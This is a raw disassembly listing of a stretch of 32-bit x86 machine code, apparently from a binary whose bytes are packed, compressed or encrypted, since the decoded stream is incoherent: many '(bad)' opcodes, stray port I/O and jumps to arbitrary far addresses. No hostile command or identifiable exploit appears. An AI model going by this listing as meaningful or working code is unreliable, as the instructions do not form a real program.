  412cda:	cmp    al,0x1c
  412cdc:	xor    ebp,esi
  412cde:	test   al,cl
  412ce0:	outs   dx,DWORD PTR ds:[esi]
  412ce1:	mov    ds,WORD PTR [ebx+0x4c]
  412ce4:	lds    ebx,FWORD PTR [esi+0x15625bdc]
  412cea:	out    dx,eax
  412ceb:	add    al,0x85
  412ced:	call   0xf708:0x2a1cd064
  412cf4:	lods   al,BYTE PTR ds:[esi]
  412cf5:	inc    ebp
  412cf6:	cmp    eax,DWORD PTR [ebp+0x14]
  412cf9:	adc    BYTE PTR [edx-0x5a11a2ea],ch
  412cff:	in     eax,dx
  412d00:	fadd   DWORD PTR gs:[ecx-0x6065e6d0]
  412d07:	stos   BYTE PTR es:[edi],al
  412d08:	data16 cmp ah,0x30
  412d0c:	out    dx,al
  412d0d:	or     eax,0x4a2281ee
  412d12:	mov    ah,0x98
  412d14:	stos   BYTE PTR es:[edi],al
  412d15:	fld    TBYTE PTR [di]
  412d18:	adc    al,0x29
  412d1a:	int3   
  412d1b:	imul   edi,esp,0xffffffa2
  412d1e:	sbb    ecx,edx
  412d20:	aaa    
  412d21:	cmp    bh,BYTE PTR [edx]
  412d23:	dec    ecx
  412d24:	mov    ah,0xcc
  412d26:	jl     0x412d12
  412d28:	cmc    
  412d29:	pop    ebp
  412d2a:	aaa    
  412d2b:	rol    DWORD PTR [eax-0x16ec8217],0xa2
  412d32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d33:	(bad)  
  412d34:	xchg   edi,eax
  412d35:	dec    ebp
  412d36:	or     bh,BYTE PTR [eax-0x11]
  412d39:	mov    ds,WORD PTR [ebp+0x7634f0ba]
  412d3f:	sub    edx,esp
  412d41:	pop    esi
  412d42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d43:	in     al,dx
  412d44:	push   cs
  412d45:	sbb    DWORD PTR [edx],ebp
  412d47:	and    DWORD PTR [eax],ecx
  412d49:	xchg   ecx,eax
  412d4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d4b:	or     al,0x94
  412d4d:	cmp    al,0xfc
  412d4f:	mov    ch,0x1e
  412d51:	scas   al,BYTE PTR es:[edi]
  412d52:	cmp    ecx,DWORD PTR [edi-0x40583353]
  412d58:	fild   QWORD PTR [eax+0x6ccde886]
  412d5e:	dec    edi
  412d5f:	or     eax,0xa1e7b87
  412d64:	jns    0x412d97
  412d66:	xor    DWORD PTR [ecx-0x2875a922],edx
  412d6c:	jne    0x412d02
  412d6e:	test   dh,bh
  412d70:	pop    ecx
  412d71:	and    eax,DWORD PTR ss:[edx+eax*4-0x5e29679c]
  412d79:	leave  
  412d7a:	mov    dh,cl
  412d7c:	mov    esp,0x71be64fe
  412d81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d83:	(bad)  
  412d84:	lahf   
  412d85:	xor    eax,0x8755e50b
  412d8a:	cmp    cl,BYTE PTR [ebx]
  412d8c:	loope  0x412d6c
  412d8e:	test   eax,0xebcfbb78
  412d93:	and    al,0x90
  412d95:	pop    ebx
  412d96:	or     ebx,DWORD PTR [ecx-0x4b7716]
  412d9c:	in     eax,dx
  412d9d:	sub    eax,0xa41923a6
  412da2:	xor    eax,0xa621ae70
  412da7:	push   0xffffff8d
  412da9:	(bad)  
  412daa:	(bad)  
  412dab:	das    
  412dac:	retf   
  412dad:	int3   
  412dae:	jne    0x412de2
  412db0:	or     al,BYTE PTR [ebx]
  412db2:	loopne 0x412dcd
  412db4:	jmp    0x8f3a81e9
  412db9:	fild   QWORD PTR [eax+esi*2-0x76]
  412dbd:	xchg   edx,eax
  412dbe:	(bad)  
  412dbf:	push   ebx
  412dc0:	jae    0x412d6a
  412dc2:	mov    bl,0x5c
  412dc4:	std    
  412dc5:	sub    eax,0x4acc7ecf
  412dca:	inc    esi
  412dcb:	mov    WORD PTR [edx-0x484e7a67],es
  412dd1:	rcr    DWORD PTR [ebx],1
  412dd3:	jge    0x412dad
  412dd5:	clc    
  412dd6:	push   ecx
  412dd7:	pop    esp
  412dd8:	retf   
  412dd9:	in     eax,0xfd
  412ddb:	mov    ch,0x1f
  412ddd:	sahf   
  412dde:	dec    eax
  412ddf:	or     al,0x4f
  412de1:	(bad)  
  412de2:	xchg   edx,eax
  412de3:	xchg   esi,eax
  412de4:	mov    al,ds:0xc6f7245f
  412de9:	fadd   QWORD PTR [edi+0x47]
  412dec:	fdiv   DWORD PTR [eax-0x1e]
  412def:	inc    esp
  412df0:	add    BYTE PTR [edi+ecx*1],ah
  412df3:	push   ss
  412df4:	gs xchg edi,eax
  412df6:	inc    esi
  412df7:	scas   eax,DWORD PTR es:[edi]
  412df8:	test   eax,0xe85ecffd
  412dfd:	ds push ecx
  412dff:	sub    edi,DWORD PTR [ecx]
  412e01:	mov    dl,bl
  412e03:	outs   dx,DWORD PTR ds:[esi]
  412e04:	mov    dh,0x6d
  412e06:	inc    edi
  412e07:	mov    bl,BYTE PTR es:[edx+0x59]
  412e0b:	repz bound ebx,QWORD PTR [ecx]
  412e0e:	mov    ebx,0x55ab81cd
  412e13:	clc    
  412e14:	retf   0x8627
  412e17:	push   cs
  412e18:	mov    ds:0xfcb3b68a,eax
  412e1d:	cmp    ch,BYTE PTR [eax]
  412e1f:	pop    es
  412e20:	mov    ebp,0xafedf4bd
  412e25:	(bad)  
  412e26:	and    eax,0x9ea60fb2
  412e2b:	push   ebx
  412e2c:	lea    ecx,[edi]
  412e2e:	fdivr  DWORD PTR [eax+0x273bd98f]
  412e34:	push   edi
  412e35:	sub    eax,0xa10bbb98
  412e3a:	popa   
  412e3b:	aad    0x14
  412e3d:	pusha  
  412e3e:	push   eax
  412e3f:	shl    ecx,0xad
  412e42:	adc    cl,cl
  412e44:	sahf   
  412e45:	pop    ds
  412e46:	and    bh,BYTE PTR [ebx+0x695a907]
  412e4c:	(bad)  
  412e4d:	retf   
  412e4e:	fsubr  DWORD PTR [ebx]
  412e50:	sar    esi,1
  412e52:	push   ds
  412e53:	pop    ds
  412e54:	inc    esi
  412e55:	bound  esi,QWORD PTR [esi+0x30]
  412e58:	dec    ebp
  412e59:	es mov ebx,0xe037e34b
  412e5f:	adc    al,0xa8
  412e61:	ret    
  412e62:	retf   0xff05
  412e65:	pop    edx
  412e66:	or     DWORD PTR ds:0xd522c4c5,edi
  412e6c:	in     al,0xea
  412e6e:	and    BYTE PTR [esi],dh
  412e70:	jmp    0x412e93
  412e72:	int3   
  412e73:	ss and eax,0x26df1c49
  412e79:	or     esp,DWORD PTR [ecx]
  412e7b:	out    dx,eax
  412e7c:	dec    ebp
  412e7d:	sbb    al,0x2d
  412e7f:	jne    0x412e12
  412e81:	(bad)  
  412e82:	push   ds
  412e83:	jns    0x412e8f
  412e85:	jnp    0x412e6f
  412e87:	push   esp
  412e88:	adc    ebx,edx
  412e8a:	xchg   ebx,eax
  412e8b:	fldcw  WORD PTR [eax-0x41]
  412e8e:	sub    edi,DWORD PTR [edx+edi*4-0x7a0db815]
  412e95:	(bad)  
  412e97:	pop    ebx
  412e98:	and    al,0xf2
  412e9a:	mov    eax,ds:0xcfee49f5
  412e9f:	imul   BYTE PTR [ecx]
  412ea1:	adc    ebp,ebp
  412ea3:	push   ss
  412ea4:	pop    es
  412ea5:	lods   al,BYTE PTR ds:[esi]
  412ea6:	adc    DWORD PTR [ebx-0x24],edi
  412ea9:	push   cs
  412eaa:	and    BYTE PTR ds:[bp+0x4d],dl
  412eaf:	sbb    eax,0xc389da3
  412eb4:	lds    ebx,FWORD PTR [esi-0x2]
  412eb7:	push   es
  412eb8:	sbb    BYTE PTR [ebp-0x3f],0x4b
  412ebc:	or     al,0xe9
  412ebe:	fldcw  WORD PTR [ebp+ecx*8-0x7c]
  412ec2:	hlt    
  412ec3:	fisubr DWORD PTR [ebx+0x7d]
  412ec6:	jmp    0xe87b75f9
  412ecb:	pop    es
  412ecc:	(bad)  
  412ecd:	rep outs dx,DWORD PTR ds:[esi]
  412ecf:	popa   
  412ed0:	ror    dh,1
  412ed2:	xor    eax,0x66b2d4e1
  412ed7:	sbb    ebx,ebx
  412ed9:	fisubr DWORD PTR [edx+0x2d]
  412edc:	out    0x2f,al
  412ede:	(bad)  
  412ee0:	xchg   esi,eax
  412ee1:	ja     0x412f0d
  412ee3:	lock sbb ch,BYTE PTR [eax]
  412ee6:	fild   QWORD PTR [edx-0x32]
  412ee9:	dec    eax
  412eea:	adc    eax,0x30506f9a
  412eef:	cs stos BYTE PTR es:[edi],al
  412ef1:	(bad)  
  412ef2:	aas    
  412ef3:	pop    eax
  412ef4:	call   0xb8be:0x5e8209a
  412efb:	jecxz  0x412f46
  412efd:	xor    al,cl
  412eff:	arpl   WORD PTR [edx+0x1e],dx
  412f02:	ins    WORD PTR es:[edi],dx
  412f04:	int3   
  412f05:	iret   
  412f06:	rcr    ch,cl
  412f08:	inc    ecx
  412f09:	out    dx,al
  412f0a:	cdq    
  412f0b:	hlt    
  412f0c:	js     0x412ecb
  412f0e:	push   ecx
  412f0f:	and    edx,edx
  412f11:	addr16 push edi
  412f13:	add    ebx,DWORD PTR [eax-0x39f6c5c]
  412f19:	(bad)  
  412f1a:	in     al,0xa1
  412f1c:	push   edx
  412f1d:	push   esp
  412f1e:	popf   
  412f1f:	fmul   QWORD PTR [ebx+0x60]
  412f22:	inc    edi
  412f23:	xor    al,0x1
  412f25:	test   BYTE PTR [esi+0x797d6a4b],al
  412f2b:	(bad)  
  412f2c:	sar    BYTE PTR [ecx+0x8bcea89],1
  412f32:	pop    eax
  412f33:	xchg   ebx,eax
  412f34:	in     al,0xdd
  412f36:	dec    esi
  412f37:	push   edx
  412f38:	mov    al,0x19
  412f3a:	pop    eax
  412f3b:	or     edi,DWORD PTR [ebx+0x3e95af45]
  412f41:	push   ebx
  412f42:	cmp    BYTE PTR [eax+0x5d8824ee],bh
  412f48:	das    
  412f49:	push   edx
  412f4a:	leave  
  412f4b:	jecxz  0x412f82
  412f4d:	xchg   ecx,eax
  412f4e:	imul   esp,DWORD PTR [ebp+0x2e],0xef24ed68
  412f55:	xchg   esi,eax
  412f56:	sub    ah,BYTE PTR [esi-0x70]
  412f59:	inc    ebx
  412f5a:	mov    dh,0x8b
  412f5c:	sahf   
  412f5d:	repnz inc eax
  412f5f:	xchg   DWORD PTR [eax],ebp
  412f61:	cli    
  412f62:	retf   
  412f63:	jnp    0x412f47
  412f65:	aad    0x69
  412f67:	int3   
  412f68:	jne    0x412f81
  412f6a:	leave  
  412f6b:	inc    eax
  412f6c:	lds    edi,FWORD PTR [edi-0x19]
  412f6f:	ret    
  412f70:	dec    ebx
  412f71:	sub    DWORD PTR [ecx+0x4f6d5326],edx
  412f77:	clc    
  412f78:	fnsave [ebp-0x65]
  412f7b:	xchg   esp,eax
  412f7c:	sar    ebp,cl
  412f7e:	setne  BYTE PTR [ebx+0x65]
  412f82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f83:	imul   BYTE PTR [edi]
  412f85:	ja     0x412f89
  412f87:	cmp    BYTE PTR [ebx+0x3ffa6ccd],bl
  412f8d:	neg    BYTE PTR [esi]
  412f8f:	sbb    al,0x8a
  412f91:	std    
  412f92:	into   
  412f93:	loope  0x412f5c
  412f95:	lock cmp DWORD PTR [esi+0x1a],ebp
  412f99:	pushf  
  412f9a:	pop    es
  412f9b:	adc    BYTE PTR [eax],0xb8
  412f9e:	(bad)  
  412f9f:	mov    esp,ebx
  412fa1:	mov    esp,0x2c7f1f17
  412fa6:	xchg   edi,eax
  412fa7:	push   ebx
  412fa9:	dec    ebx
  412faa:	popf   
  412fab:	pop    ecx
  412fac:	sbb    ah,BYTE PTR [eax]
  412fae:	in     eax,dx
  412faf:	adc    BYTE PTR [ebp+0x2d43e817],0x73
  412fb6:	or     esi,DWORD PTR [eax]
  412fb8:	ret    
  412fb9:	stos   BYTE PTR es:[edi],al
  412fba:	sti    
  412fbb:	call   DWORD PTR [edi]
  412fbd:	in     al,dx
  412fbe:	imul   ebp,DWORD PTR [esi+0x646703c4],0xa30285de
  412fc8:	ret    
  412fc9:	push   0xffffffe0
  412fcb:	shl    edx,0x5e
  412fce:	fadd   DWORD PTR [ebx]
  412fd0:	inc    edi
  412fd1:	pop    edi
  412fd2:	adc    eax,0x2f4126e5
  412fd7:	xchg   edi,eax
  412fd8:	cld    
  412fd9:	jno    0x413041
  412fdb:	popa   
  412fdc:	sbb    edx,DWORD PTR [edx+0x3fc6cf58]
  412fe2:	push   ss
  412fe3:	inc    ebx
  412fe4:	jnp    0x413013
  412fe6:	adc    al,0xce
  412fe8:	std    
  412fe9:	jecxz  0x413053
  412feb:	dec    eax
  412fec:	sbb    ebp,ecx
  412fee:	mov    eax,ds:0x20f97253
  412ff3:	loop   0x41304d
  412ff5:	pop    ds
  412ff6:	push   esp
  412ff7:	aas    
  412ff8:	stos   DWORD PTR es:[edi],eax
  412ff9:	mov    ds:0x3b26f71f,al
  412ffe:	adc    BYTE PTR [esi-0x6e317fcc],dl
  413004:	mov    fs,WORD PTR [edi+0x18845cbf]
  41300a:	inc    edx
  41300b:	in     al,dx
  41300c:	mov    cl,0xe6
  41300e:	int    0x4b
  413010:	and    esp,eax
  413012:	repnz add esp,DWORD PTR [esi+0x61]
  413016:	jecxz  0x412fd2
  413018:	stos   BYTE PTR es:[edi],al
  413019:	(bad)  
  41301a:	cdq    
  41301b:	push   ss
  41301c:	out    0xed,al
  41301e:	xor    bl,ah
  413020:	mov    ecx,0xcf000d50
  413025:	fsubr  DWORD PTR [ebp+0x52]
  413028:	push   0xffffffaf
  41302a:	mov    bh,0xc3
  41302c:	dec    esp
  41302d:	pop    eax
  41302e:	popf   
  41302f:	add    DWORD PTR [ebx+0x3503c211],0xcefae0b5
  413039:	(bad)  
  41303a:	iret   
  41303b:	xor    bl,BYTE PTR [edi]
  41303d:	adc    eax,DWORD PTR [edx-0x31]
  413040:	icebp  
  413041:	inc    BYTE PTR [edx+0xd0bde00]
  413047:	mov    bh,bh
  413049:	and    DWORD PTR [edi],ebx
  41304b:	neg    BYTE PTR [bp+di]
  41304e:	dec    esp
  41304f:	jb     0x413064
  413051:	loop   0x412ff3
  413053:	push   0x73
  413055:	jmp    0x3c2c:0x59371f45
  41305c:	sbb    DWORD PTR [eax],edx
  41305e:	scas   eax,DWORD PTR es:[edi]
  41305f:	fwait
  413060:	pushf  
  413061:	(bad)  
  413062:	xor    DWORD PTR [ecx+0x32],ebx
  413065:	mov    edx,?
  413067:	sahf   
  413068:	mov    ah,0x34
  41306a:	pusha  
  41306b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41306c:	adc    BYTE PTR [eax+0x76],0x2e
  413070:	mov    edx,DWORD PTR [ebp-0x5]
  413073:	sbb    DWORD PTR [ecx-0x3512c228],ecx
  413079:	test   al,0xb0
  41307b:	enter  0x8a7a,0xe4
  41307f:	dec    ecx
  413080:	xor    BYTE PTR [eax],0xe
  413083:	out    0x8f,eax
  413085:	or     eax,DWORD PTR [ebp+0x2578fe98]
  41308b:	cmp    ah,BYTE PTR [edx-0x53d476c8]
  413091:	pop    eax
  413092:	std    
  413093:	std    
  413094:	rcl    DWORD PTR cs:[esi+0x2f],0xaa
  413099:	pop    esp
  41309a:	in     al,0xe6
  41309c:	add    ebx,DWORD PTR [esi]
  41309e:	cmp    eax,0x7011b7e4
  4130a3:	push   es
  4130a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130a5:	(bad)  
  4130a7:	daa    
  4130a8:	mov    ds:0xe6bb7ce3,eax
  4130ad:	inc    eax
  4130ae:	and    edx,esi
  4130b0:	sub    BYTE PTR es:[edx+ecx*1+0x1f650380],0x86
  4130b9:	pop    es
  4130ba:	jns    0x4130a7
  4130bc:	sbb    al,0x35
  4130be:	push   eax
  4130bf:	ins    BYTE PTR es:[edi],dx
  4130c0:	mov    al,0xb1
  4130c2:	push   ds
  4130c3:	jb     0x413081
  4130c5:	pop    es
  4130c6:	sub    al,0xc3
  4130c8:	mov    dl,0x7e
  4130ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130cb:	test   DWORD PTR [edi-0x49c656d9],eax
  4130d1:	sub    BYTE PTR [ebp+0x58],al
  4130d4:	add    ecx,DWORD PTR ss:[ecx]
  4130d7:	daa    
  4130d8:	(bad)  
  4130d9:	or     eax,0x341d675b
  4130de:	cmp    DWORD PTR [ebx+0x56],0x7f145745
  4130e5:	push   eax
  4130e6:	js     0x41311a
  4130e8:	sbb    al,0x4f
  4130eb:	nop
  4130ec:	adc    DWORD PTR [edx],ebx
  4130ee:	sar    BYTE PTR [edx],0x6e
  4130f1:	add    BYTE PTR [ecx-0x4391cc18],0x63
  4130f8:	mov    esi,ebp
  4130fa:	and    cl,BYTE PTR [eax+0x5e10f494]
  413100:	jle    0x4130dd
  413102:	aas    
  413103:	inc    edi
  413104:	dec    ebp
  413105:	mov    dl,0x59
  413107:	aaa    
  413108:	outs   dx,BYTE PTR ds:[esi]
  413109:	dec    esp
  41310a:	or     eax,0x219376dd
  41310f:	stc    
  413110:	cwde   
  413111:	rol    ah,cl
  413113:	into   
  413114:	fcomp  DWORD PTR [eax]
  413116:	jb     0x4130b7
  413118:	sbb    cl,BYTE PTR [eax+0x6f]
  41311b:	loope  0x413141
  41311d:	dec    ebx
  41311e:	inc    ebx
  41311f:	fs popf 
  413121:	mov    dl,0x79
  413123:	aam    0xb7
  413125:	arpl   WORD PTR [ebx-0x1c],ax
  413128:	add    ecx,ecx
  41312a:	push   esp
  41312b:	sub    eax,0x65729d5b
  413130:	std    
  413131:	push   0x32b5b43a
  413136:	xor    eax,0x2fc89f33
  41313b:	daa    
  41313c:	lods   al,BYTE PTR ds:[esi]
  41313d:	jle    0x4130fc
  41313f:	adc    bh,BYTE PTR [ecx+eiz*2+0x53]
  413143:	add    dl,BYTE PTR [ecx+edx*1+0x51d94c0f]
  41314a:	and    eax,0x71af4b0f
  41314f:	cdq    
  413150:	mov    eax,ds:0xea58c728
  413155:	dec    esi
  413156:	sahf   
  413157:	adc    cl,ah
  413159:	loop   0x413181
  41315b:	jmp    0x272af34d
  413160:	cmp    eax,0xf05faed7
  413165:	shl    DWORD PTR [eax-0x681dc6d7],0x6b
  41316c:	mov    bl,0x91
  41316e:	ror    BYTE PTR [ebp-0x3d],1
  413171:	xor    BYTE PTR ds:0x6dda7421,dl
  413177:	add    esp,DWORD PTR [edi+0x2b]
  41317a:	fsubrp st(1),st
  41317c:	aaa    
  41317d:	icebp  
  41317e:	mov    BYTE PTR [eax+0x1d75b860],bl
  413184:	dec    esp
  413185:	mov    edi,0x60f9f2a1
  41318a:	cmp    dh,BYTE PTR [ecx+0x1cd96d77]
  413190:	mov    ebp,0xa0101a96
  413195:	xor    BYTE PTR [edi+0x3d98f56a],bl
  41319b:	jnp    0x4131d4
  41319d:	sbb    ch,al
  41319f:	(bad)
  4131a2:	(bad)  
  4131a3:	stos   BYTE PTR es:[edi],al
  4131a4:	ss push ebx
  4131a6:	pop    esp
  4131a7:	ins    DWORD PTR es:[edi],dx
  4131a8:	in     eax,dx
  4131a9:	sahf   
  4131aa:	je     0x41313d
  4131ac:	ja     0x4131ae
  4131ae:	aad    0x99
  4131b0:	jb     0x4131c4
  4131b2:	lahf   
  4131b3:	cld    
  4131b4:	adc    DWORD PTR [eax+0x75fe3719],0xcb91b0db
  4131be:	aaa    
  4131bf:	retf   
  4131c0:	sbb    BYTE PTR [esi],dl
  4131c2:	stos   DWORD PTR es:[edi],eax
  4131c3:	pushf  
  4131c4:	xor    BYTE PTR [esi],ah
  4131c6:	or     al,0x7b
  4131c8:	fdivr  DWORD PTR [ecx+eax*2+0x8a0e1f5]
  4131cf:	ret    0x5428
  4131d2:	stos   BYTE PTR es:[edi],al
  4131d3:	xor    ebx,esp
  4131d5:	fwait
  4131d6:	adc    edi,DWORD PTR [ecx]
  4131d8:	rcr    BYTE PTR [ecx+esi*8],1
  4131db:	mov    ebx,0x42417289
  4131e0:	retf   
  4131e1:	add    DWORD PTR [ecx-0x7],eax
  4131e4:	clc    
  4131e5:	inc    ebx
  4131e6:	xchg   BYTE PTR [edi-0x4ef162fb],al
  4131ec:	call   0xaa97:0xd4032751
  4131f3:	inc    eax
  4131f4:	mov    dl,0x66
  4131f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131f7:	cmp    dh,bh
  4131f9:	ss adc al,0xfb
  4131fc:	or     eax,0x8f2c1642
  413201:	ficom  DWORD PTR [edx]
  413203:	mov    ebx,0x66c63926
  413208:	and    DWORD PTR [edx+0x4b31a45d],0xffffffad
  41320f:	mov    eax,0x552fd0e1
  413214:	sub    al,0xa2
  413216:	add    al,0xfa
  413218:	jns    0x4131d3
  41321a:	jge    0x4131c4
  41321c:	aaa    
  41321d:	and    BYTE PTR [ecx],ch
  41321f:	lahf   
  413220:	popf   
  413221:	push   ebp
  413222:	dec    eax
  413223:	inc    ecx
  413224:	dec    edi
  413225:	xor    al,0x7a
  413227:	fs aaa 
  413229:	jle    0x413253
  41322b:	cmp    eax,0x924d9ac8
  413230:	fsubr  st(3),st
  413232:	scas   eax,DWORD PTR es:[edi]
  413233:	or     DWORD PTR [esp+ebp*2],ecx
  413236:	iret   
  413237:	xchg   BYTE PTR [ecx-0x7d],cl
  41323a:	in     eax,0x67
  41323c:	enter  0x5aea,0xf7
  413240:	js     0x413235
  413242:	inc    edx
  413243:	test   al,0xb5
  413245:	or     DWORD PTR [edi-0x161f1cc1],esi
  41324b:	inc    eax
  41324c:	sub    eax,0x9c4e0fe
  413251:	jmp    0xbfcb96e6
  413256:	sbb    esp,DWORD PTR [ebx-0x40]
  413259:	shr    DWORD PTR [eax],cl
  41325b:	pop    ss
  41325c:	sbb    DWORD PTR [eax+0x77358dbe],ebx
  413262:	aam    0x8
  413264:	ss cs mov bl,0x45
  413268:	jmp    0x413262
  41326a:	and    BYTE PTR [eax],bl
  41326c:	inc    edi
  41326d:	pop    ss
  41326e:	xchg   DWORD PTR [eax+0x7b],esp
  413271:	push   eax
  413272:	ins    DWORD PTR es:[edi],dx
  413273:	jne    0x41327a
  413275:	mov    DWORD PTR [eax+ecx*2+0xc],eax
  413279:	stos   BYTE PTR es:[edi],al
  41327a:	jl     0x4132c9
  41327c:	or     al,0x48
  41327e:	data16 addr16 jp 0x413229
  413282:	push   edx
  413283:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413284:	rol    DWORD PTR [ebx+0x72],cl
  413287:	sahf   
  413288:	push   es
  413289:	push   esi
  41328a:	stc    
  41328b:	je     0x41326c
  41328d:	sub    BYTE PTR [ebx+ecx*1],0xf2
  413291:	ins    BYTE PTR es:[edi],dx
  413292:	pop    esi
  413293:	scas   eax,DWORD PTR es:[edi]
  413294:	mov    ch,0xd0
  413296:	jmp    0x4132bc
  413298:	lods   eax,DWORD PTR ds:[esi]
  413299:	mov    bh,0x59
  41329b:	jl     0x413286
  41329d:	xchg   esi,eax
  41329e:	jo     0x41329b
  4132a0:	push   esp
  4132a1:	jp     0x4132eb
  4132a3:	cmp    DWORD PTR [eax+ebx*8+0x23406b88],edx
  4132aa:	mov    ecx,0x581aa38
  4132af:	add    eax,0xa94c158a
  4132b4:	stos   BYTE PTR es:[edi],al
  4132b5:	test   BYTE PTR [eax+0x4a],dh
  4132b8:	cmp    edx,DWORD PTR [edi+0xd680509]
  4132be:	ja     0x413312
  4132c0:	(bad)  
  4132c1:	popf   
  4132c2:	cmp    eax,0x90efc49e
  4132c7:	cmp    ch,0xf2
  4132ca:	pop    eax
  4132cb:	push   ebx
  4132cc:	xchg   ecx,eax
  4132cd:	dec    ecx
  4132ce:	add    al,0xdf
  4132d0:	push   0x34aaf56d
  4132d5:	jns    0x41330e
  4132d7:	out    0x47,al
  4132d9:	mov    DWORD PTR [edi],esp
  4132db:	xchg   BYTE PTR [eax+0x53532a59],ch
  4132e1:	ins    DWORD PTR es:[edi],dx
  4132e2:	xor    ebx,DWORD PTR [ebp+0xbcc9055]
  4132e8:	gs and eax,0xe0f96550
  4132ee:	xor    cl,BYTE PTR [ecx+ebp*8+0x53]
  4132f2:	mov    dl,0x57
  4132f4:	mov    eax,ds:0xb0e7331b
  4132f9:	shl    ah,cl
  4132fb:	or     DWORD PTR [ecx],edi
  4132fd:	mov    esp,0xfcb1cee
  413303:	add    al,0x6f
  413305:	xor    eax,DWORD PTR [ebx]
  413307:	dec    edx
  413308:	nop
  413309:	pop    ebp
  41330a:	ins    BYTE PTR es:[edi],dx
  41330b:	sub    al,BYTE PTR [edi+0x0]
  41330e:	mov    bl,0xe7
  413310:	cmp    eax,0x5c9b3614
  413315:	popa   
  413316:	push   0xffffffc3
  413318:	xchg   DWORD PTR [edx-0x23f25755],ecx
  41331e:	jg     0x4132d5
  413320:	mov    ds,WORD PTR [edx-0x7aa436fd]
  413326:	mov    edx,DWORD PTR [ebp-0x1546dd7e]
  41332c:	(bad)  
  41332d:	(bad)  
  41332e:	mov    DWORD PTR [edi+0x94c8388],eax
  413334:	lods   eax,DWORD PTR ds:[esi]
  413335:	and    BYTE PTR [ecx],0x53
  413338:	inc    ecx
  413339:	adc    al,ah
  41333b:	cmp    eax,0xe91ad831
  413340:	sub    DWORD PTR [eax],ebp
  413342:	dec    edi
  413343:	imul   ecx,DWORD PTR [ecx-0xde25f1f],0x2a9ff093
  41334d:	test   eax,0x41494362
  413352:	stc    
  413353:	lea    edi,[edi+eax*2-0x64eec1b7]
  41335a:	outs   dx,DWORD PTR ds:[esi]
  41335b:	mov    ecx,DWORD PTR [ebx+0x790efa05]
  413361:	je     0x4133bc
  413363:	call   0xf19a9c6
  413368:	jl     0x4133cf
  41336a:	jge    0x413348
  41336c:	leave  
  41336d:	daa    
  41336e:	pusha  
  41336f:	inc    eax
  413370:	ins    BYTE PTR es:[edi],dx
  413371:	pop    edx
  413372:	bound  eax,QWORD PTR [ebx-0x6a]
  413375:	inc    edx
  413376:	dec    esp
  413377:	sub    esp,esi
  413379:	ins    DWORD PTR es:[edi],dx
  41337a:	inc    esi
  41337b:	dec    edx
  41337c:	arpl   WORD PTR [edx],cx
  41337e:	mov    dh,0x49
  413380:	pop    ebx
  413381:	dec    eax
  413382:	cmp    al,0xc1
  413384:	(bad)  
  413385:	(bad)  
  413386:	test   eax,0xae4c9822
  41338b:	dec    edx
  41338c:	cmp    eax,0x9fa802ab
  413391:	mov    bp,0x81a7
  413395:	lods   al,BYTE PTR ds:[esi]
  413396:	fdiv   DWORD PTR [ecx]
  413398:	fisub  WORD PTR [eax-0x296cb139]
  41339e:	loop   0x413346
  4133a0:	aaa    
  4133a1:	xchg   ebp,eax
  4133a2:	hlt    
  4133a3:	outs   dx,BYTE PTR ds:[esi]
  4133a4:	div    DWORD PTR [edx-0x332bae2a]
  4133aa:	sub    edx,DWORD PTR [edx+edx*8]
  4133ad:	jmp    FWORD PTR [edi]
  4133af:	sub    ebp,DWORD PTR [ebp+0x23]
  4133b2:	mov    ch,0x15
  4133b4:	dec    ecx
  4133b5:	mov    ecx,0x3454d61f
  4133ba:	and    DWORD PTR [esi],eax
  4133bc:	mov    eax,cs:0xf7f1b649
  4133c2:	push   esp
  4133c3:	dec    esi
  4133c4:	pop    es
  4133c5:	(bad)  
  4133c6:	mov    al,ds:0x8f68c879
  4133cb:	retf   
  4133cc:	jl     0x413407
  4133ce:	adc    eax,0x6fe2cef3
  4133d3:	pop    eax
  4133d4:	jp     0x4133cf
  4133d6:	mov    bh,0xc5
  4133d8:	and    al,0xbd
  4133da:	das    
  4133db:	js     0x4133a5
  4133dd:	xchg   ebp,eax
  4133de:	inc    edi
  4133df:	imul   edx,esi,0xc85e572c
  4133e5:	shl    edi,cl
  4133e7:	sbb    eax,0xff0a0ea3
  4133ec:	push   ebx
  4133ed:	sbb    BYTE PTR [eax+0x7bf4a197],bl
  4133f3:	cld    
  4133f4:	jg     0x413425
  4133f6:	xor    dh,BYTE PTR ds:0x902b8e6b
  4133fc:	xchg   ebp,eax
  4133fd:	out    0xc9,al
  4133ff:	rcr    ebx,1
  413401:	loopne 0x413435
  413403:	test   al,0xc2
  413405:	add    BYTE PTR [ebp+0x4de2796f],ah
  41340b:	mov    edx,edx
  41340d:	push   edi
  41340e:	and    edx,DWORD PTR [eax+0x15]
  413411:	mov    BYTE PTR [ebx-0x6e],bh
  413414:	bound  ecx,QWORD PTR [ebx-0x45]
  413417:	mov    al,0x37
  413419:	jb     0x413483
  41341b:	stos   DWORD PTR es:[edi],eax
  41341c:	fidivr WORD PTR [esi]
  41341e:	jmp    0x80ca1182
  413423:	cdq    
  413424:	jle    0x4133c7
  413426:	dec    esi
  413427:	cmp    dl,BYTE PTR [ecx-0x7bcbe7fb]
  41342d:	retf   0x32be
  413430:	sbb    eax,0xf2ac9d59
  413435:	shl    ah,1
  413437:	aam    0x8d
  413439:	inc    esp
  41343a:	retf   
  41343b:	xlat   BYTE PTR ds:[ebx]
  41343c:	pop    es
  41343d:	loop   0x4133d5
  41343f:	test   DWORD PTR [esi+0x753e1cd6],ecx
  413445:	adc    BYTE PTR [ecx-0x3],0x8c
  413449:	and    cl,0x1d
  41344c:	cmp    eax,0xd6ba2bca
  413451:	push   0x23
  413453:	and    BYTE PTR [ebp+0x4764376f],dh
  413459:	lock retf 0xdf8d
  41345d:	dec    eax
  41345e:	sbb    ah,BYTE PTR [esi+0x1e]
  413461:	sahf   
  413462:	xor    ebp,esi
  413464:	push   0x84ddc0
  413469:	cmp    esp,DWORD PTR [edi]
  41346b:	gs out 0x11,eax
  41346e:	popf   
  41346f:	pop    ss
  413470:	cs adc eax,0xe6344f65
